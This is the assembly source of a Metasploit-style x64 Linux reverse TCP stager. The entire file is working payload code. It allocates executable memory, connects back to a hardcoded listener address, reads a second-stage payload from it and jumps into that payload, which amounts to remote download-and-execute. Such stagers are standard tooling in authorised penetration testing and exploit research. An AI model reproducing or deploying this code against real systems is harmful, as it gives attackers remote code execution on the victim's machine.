##
#
#        Name: stager_sock_reverse
#   Qualities: -
#     Authors: nemo <nemo [at] felinemenace.org>, tkmru
#     License: MSF_LICENSE
# Description:
#
#        Implementation of a Linux reverse TCP stager for x64 architecture.
#
#        Assemble with: gcc -nostdlib stager_sock_reverse.s -o stager_sock_reverse
#
# Meta-Information:
#
# meta-shortname=Linux Reverse TCP Stager
# meta-description=Connect back to the framework and run a second stage
# meta-authors=ricky, tkmru
# meta-os=linux
# meta-arch=x64
# meta-category=stager
# meta-connection-type=reverse
# meta-name=reverse_tcp
##

.text
.globl _start
_start:
  xor    %rdi, %rdi
  push   $0x9
  pop    %rax
  cdq
  mov    $0x10, %dh
  mov    %rdx, %rsi
  xor    %r9, %r9
  push   $0x22
  pop    %r10
  mov    $0x7, %dl
  syscall # mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC|0x1000, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
  test   %rax, %rax
  js     failed

  push   %rsi
  push   %rax
  push   $0x29
  pop    %rax
  cdq
  push   $0x2
  pop    %rdi
  push   $0x1
  pop    %rsi
  syscall # socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
  test   %rax, %rax
  js     failed

  xchg   %rax, %rdi
  movabs $0x100007fb3150002, %rcx
  push   %rcx
  mov    %rsp, %rsi
  push   $0x10
  pop    %rdx
  push   $0x2a
  pop    %rax
  syscall # connect(3, {sa_family=AF_INET, LPORT, LHOST, 16)
  test   %rax, %rax
  js     failed

  pop    %rcx
  pop    %rsi
  pop    %rdx
  syscall # read(3, "", 4096)
  jmpq   *%rsi
  test   %rax, %rax
  js     failed

  jmpq   *%rsi # to stage

failed:
  push   $0x3c
  pop    %rax
  push   $0x1
  pop    %rdi
  syscall # exit(1)
